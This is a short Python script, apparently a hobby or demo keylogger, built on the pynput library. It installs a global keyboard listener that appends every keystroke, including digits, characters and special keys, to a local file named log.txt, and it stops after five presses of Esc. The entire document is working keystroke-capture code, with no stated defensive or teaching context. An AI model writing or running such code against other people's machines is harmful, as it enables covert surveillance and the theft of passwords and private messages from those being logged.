from pynput import keyboard

count = 0


def on_press(key):
    global count
    try:
        if hasattr(key, 'vk') and 96 <= key.vk <= 105:
            #print('You entered a number from the numpad: ', key.vk - 96)
            with open("log.txt", "a", encoding='utf-8') as file:
                text = ("{0}".format(key.vk - 96))
                file.write(text)
        else:
            #print('alphanumeric key {0} pressed'.format(key.char))
            with open("log.txt", "a", encoding='utf-8') as file:
                text = ("{0}".format(key.char))
                file.write(text)
    except AttributeError:
        #print('special key {0} pressed'.format(key))
        if key == keyboard.Key.enter:
            with open("log.txt", "a", encoding='utf-8') as file:
                text = "\n"
                file.write(text)
        elif key == keyboard.Key.space:
            with open("log.txt", "a", encoding='utf-8') as file:
                text = " "
                file.write(text)
        elif key == keyboard.Key.tab:
            with open("log.txt", "a", encoding='utf-8') as file:
                text = "\t"
                file.write(text)
        elif key == keyboard.Key.shift:
            pass
        elif key == keyboard.Key.esc:
            pass
        else:
            with open("log.txt", "a", encoding='utf-8') as file:
                text = ("|{0}|".format(key))
                file.write(text)
    if key != keyboard.Key.esc:
        count = 0
    else:
        pass


def on_release(key):
    global count
    if key == keyboard.Key.esc:
        count += 1
        #print("Count: ", count)
    if count >= 5:
        return False


# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
